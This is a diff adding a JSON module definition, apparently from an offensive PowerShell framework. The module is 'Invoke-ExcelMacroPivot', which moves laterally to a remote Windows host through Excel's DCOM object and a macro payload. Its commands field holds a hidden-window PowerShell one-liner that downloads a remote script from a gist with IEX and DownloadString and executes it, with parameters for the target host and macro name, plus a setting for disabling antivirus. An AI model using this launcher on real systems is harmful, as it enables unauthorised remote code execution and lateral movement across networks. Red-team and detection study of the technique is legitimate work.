@@ -1,0 +1,37 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-ExcelMacroPivot",
+    "author": ["Matt Nelson (@enigma0x3)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-ExcelMacroPivot"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": true,
+    "notes": "Pivots to a remote host by using an Excel macro and Excel's COM object",
+    "remote": "https://gist.githubusercontent.com/enigma0x3/8d0cabdb8d49084cdcf03ad89454798b/raw/e45321569202367e6fea440ddd84d155781553cf/Invoke-ExcelMacroPivot.ps1",
+    "local": ["data", "src", "enigma0x3", "gists", "Invoke-ExcelMacroPivot.ps1"],
+    "options": [
+      {"name": "Target", "value": "127.0.0.1", "required": true, "flag":"-Target", "description":"Remote host to pivot to"},
+      {"name": "RemoteDocumentPath", "value": "C:\\Book1.xlsm", "required": true, "flag":"-RemoteDocumentPath", "description":"Local path on the remote host where the payload resides"},
+      {"name": "MacroName", "value": "Auto_Open", "required": true, "flag":"-MacroName", "description":"The name of the macro residing in the payload document"}
+    ],
+    "description": "Pivots to a remote host by using an Excel macro and Excel's COM object",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/enigma0x3/8d0cabdb8d49084cdcf03ad89454798b/raw/e45321569202367e6fea440ddd84d155781553cf/Invoke-ExcelMacroPivot.ps1');",
+      "Invoke-ExcelMacroPivot",
+      "{{Target}}",
+      "{{RemoteDocumentPath}}",
+      "{{MacroName}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
